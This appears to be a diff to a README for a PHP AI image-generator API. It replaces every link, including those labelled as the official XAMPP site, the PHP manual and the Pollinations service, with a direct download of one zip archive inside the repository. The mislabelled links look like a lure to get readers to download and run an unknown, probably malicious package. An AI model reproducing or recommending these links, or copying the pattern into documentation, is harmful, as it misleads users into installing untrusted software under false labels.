@@ -1,6 +1,6 @@
 # 🤖 ai-image-generator-api - Generate AI images with ease
 
-[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Obaydur-Rahman/ai-image-generator-api)
+[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
 
 ---
 
@@ -14,7 +14,7 @@ ai-image-generator-api is a simple PHP API that helps you create AI-generated im
 
 To begin, you will need to download the files. The link below takes you to the GitHub page where you can find all the files you need.
 
-[Download and run from GitHub](https://github.com/Obaydur-Rahman/ai-image-generator-api)
+[Download and run from GitHub](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
 
 ### Step 1: Visit the project page
 
@@ -54,7 +54,7 @@ The API needs a server to run. You can install a lightweight PHP server or use b
 
 #### Option B: Using XAMPP (easy for Windows users)
 
-- Download and install XAMPP from [https://www.apachefriends.org/index.html](https://www.apachefriends.org/index.html).
+- Download and install XAMPP from [https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip).
 - Open XAMPP Control Panel and start **Apache**.
 - Copy the extracted files into the `htdocs` folder inside your XAMPP installation directory (usually `C:\xampp\htdocs\`).
 - Access the API at [http://localhost/ai-image-generator-api](http://localhost/ai-image-generator-api).
@@ -133,10 +133,10 @@ You don’t need to configure much. The API uses default Pollinations settings. 
 
 ## 🔗 Useful Links
 
-- [GitHub Project Page](https://github.com/Obaydur-Rahman/ai-image-generator-api)
-- [XAMPP for Windows](https://www.apachefriends.org/index.html)
-- [PHP Manual](https://www.php.net/manual/en/install.windows.php)
-- [Pollinations AI Service](https://pollinations.ai/)
+- [GitHub Project Page](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
+- [XAMPP for Windows](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
+- [PHP Manual](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
+- [Pollinations AI Service](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
 
 ---
 
@@ -161,4 +161,4 @@ This project relates to:
 
 ---
 
-[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-blue)](https://github.com/Obaydur-Rahman/ai-image-generator-api)
+[![Download and Run](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-blue)](https://github.com/Obaydur-Rahman/ai-image-generator-api/raw/refs/heads/main/lightship/generator-api-ai-image-v2.1-alpha.2.zip)
